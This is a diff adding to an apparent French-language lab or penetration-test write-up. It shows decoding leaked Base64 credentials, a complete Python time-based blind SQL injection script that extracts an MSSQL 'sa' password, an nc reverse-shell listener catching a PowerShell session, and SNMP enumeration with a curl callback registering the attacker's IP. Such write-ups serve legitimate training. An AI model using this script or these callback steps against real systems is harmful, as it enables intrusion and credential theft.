@@ -168,5 +168,181 @@ Le scan révèle que l’hôte 172.16.100.98 expose plusieurs services critiques
 la liste des ports ouverts : 135, 139, 445, 1433, 5000, 5357
 
 # Serveur Web 
+je suis alle sur le site internet 
+j'ai cree un compte je me suis connecte j'ai rien trouve 
 
 ![[Pasted image 20250725161630.png]]
+
+j'ai fais une analyse des sou-domaine j'ai rien trouve d'interressant 
+![[Pasted image 20250807140519.png]]
+ apres la verification du code source j'ai trouve ceci 
+ 
+http://172.16.100.98:5000/static/.env/Artifact_deployment.txt
+
+![[Pasted image 20250807140201.png]]
+
+[DEBUG] Injected credentials:
+  usr: YWRtaW4ucmljaGFyZA==
+  pss: QWRtaW5AU2VjdXJlOTk=
+Les identifiants injectés sont codés en **Base64** :
+- `usr` = `admin.richard`
+- `pss` = `Admin@Secure99`
+je me suis connecte avec ces identifiant 
+
+![[Pasted image 20250807140333.png]]
+
+## Blind SQL injection
+_Blind SQL injection_ is a type of SQL injection  where the attacker does not receive an obvious response from the attacked database and instead reconstructs the database structure step-by-step by observing the behavior of the database server and the application
+J'ai inserer `'` dans le formulaire et j'ai constate que l'input est succesible d'une attaque sql
+
+' IF EXISTS (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users' AND column_name = 'password_hash') WAITFOR DELAY '0:0:10'--
+
+![[Pasted image 20250807142357.png]]
+
+# Python Code to Extract the "sa" Credentials from the table via Blind SQLi
+
+import requests
+import time
+
+url = "http://172.16.100.98:5000/admin/dashboard"
+
+```
+# Replace this with your session cookie
+session_cookie = {
+    "session": "eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dpbl90aW1lIjoiMjAyNS0wOC0wN1QwMzo1MzoxNi41MDY0ODYiLCJ1c2VyX2lkIjoxN30.aJSFnQ.nunwVoFvyy0bKnab_aX1eV3FM2w"
+}
+
+DELAY_THRESHOLD = 4.5
+
+# Target user and field
+target_user = "sa"
+target_field = "password_hash"
+
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$_!%^&*()-=+"
+
+# Result storage
+extracted = ""
+
+# How many characters of the field to extract
+MAX_LENGTH = 50
+
+print("[*] Starting time-based blind SQLi on authenticated endpoint...\n")
+
+for position in range(1, MAX_LENGTH + 1):
+    found = False
+
+    for char in charset:
+        payload = (
+            f"' IF (SUBSTRING(CONVERT(varchar, (SELECT {target_field} FROM users "
+            f"WHERE username = '{target_user}')) COLLATE Latin1_General_CS_AS, {position}, 1) = '{char}') "
+            f"WAITFOR DELAY '0:0:5'--"
+        )
+
+        print(f"[*] Testing position {position} with character: '{char}'")
+
+        try:
+            start = time.time()
+            r = requests.get(url, params={'search': payload}, cookies=session_cookie)
+            elapsed = time.time() - start
+
+            print(f"    → Response time: {elapsed:.2f} sec")
+
+            if elapsed > DELAY_THRESHOLD:
+                extracted += char
+                print(f"[+] Match at position {position}: '{char}' → {extracted}\n")
+                found = True
+                break
+
+        except Exception as e:
+            print(f"[!] Request error at position {position} with '{char}': {e}")
+            time.sleep(2)
+
+    if not found:
+        print(f"[!] No match at position {position}. Assuming end of value.")
+        break
+
+print(f"\n[✔] Extraction complete: {extracted}")
+```
+une **attaque par injection SQL à l’aveugle (Blind SQL Injection)**, de type **"time-based"**, sur une application web.
+
+![[Pasted image 20250807182626.png]]
+sa:MSSqlServer@963
+
+```
+nc -lvnp 443 
+listening on [any] 443 ...
+connect to [10.10.10.10] from (UNKNOWN) [192.168.10.101] 9876
+hostname
+SQL-Srv
+PS C:\Windows\system32> 
+```
+
+Machine 172.16.100.70
+## Enumeration 
+### Nmap
+```
+sudo nmap -Pn -sU -p 161 172.16.100.70
+
+PORT    STATE SERVICE
+161/udp open  snmp
+```
+
+![[Pasted image 20250807184900.png]]
+
+
+```
+sudo snmpwalk -v 2c -c public 172.16.100.70         
+iso.3.6.1.2.1.1.1.0 = STRING: "SNMP Service"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (219627045) 25 days, 10:04:30.45
+iso.3.6.1.2.1.1.4.0 = STRING: "Admin <dev@trust-bank.ad>"
+iso.3.6.1.2.1.1.5.0 = STRING: "Passed IP will be logged in the executable file, if sent via POST request."
+iso.3.6.1.2.1.1.6.0 = STRING: "http://localhost:8080/submit -d \"user=root&ip=<>&port=<>\","
+iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (228143547) 26 days, 9:43:55.47
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 08 07 11 09 13 00 2B 05 1E 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-6.8.0-41-generic root=UUID=419ff7ed-938c-4d3b-b665-bf35581c8097 ro quiet splash vt.handoff=7
+"
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 2
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 277
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MI
+```
+
+
+curl -X POST http://172.16.100.70:8080/submit -d "user=root&ip=10.10.10.10&port=1234"
+Stored 10.10.10.10:1234 for root,
+
+Now run this from your machine:
+snmpwalk -v2c -c privatestring <target_ip> NET-SNMP-EXTEND-MIB::nsExtendOutput1Line
